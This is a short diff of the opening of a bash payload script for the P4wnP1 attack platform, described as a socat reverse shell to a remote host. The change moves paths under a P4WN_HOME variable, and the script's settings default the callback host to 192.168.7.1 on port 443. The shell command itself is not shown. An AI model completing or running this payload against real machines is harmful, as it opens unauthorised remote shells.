@@ -1,15 +1,16 @@
 #!/bin/bash
-# /opt/p4wnp1-o2/payloads/network/reverse_shell_tunnel.sh
+# /opt/p4wnp1/payloads/network/reverse_shell_tunnel.sh
 # Description: Reverse shell using socat to remote host and port
 
 set -euo pipefail
 
 # === Config ===
-CONFIG="/opt/p4wnp1-o2/config/reverse_shell.conf"
+P4WN_HOME="${P4WN_HOME:-/opt/p4wnp1}"
+CONFIG="$P4WN_HOME/config/reverse_shell.conf"
 [ -f "$CONFIG" ] && source "$CONFIG"
 
 PAYLOAD_NAME="reverse_shell_tunnel"
-LOG_DIR="/opt/p4wnp1-o2/logs"
+LOG_DIR="$P4WN_HOME/logs"
 LOG_FILE="$LOG_DIR/${PAYLOAD_NAME}.log"
 REMOTE_HOST="${RS_HOST:-192.168.7.1}"
 REMOTE_PORT="${RS_PORT:-443}"
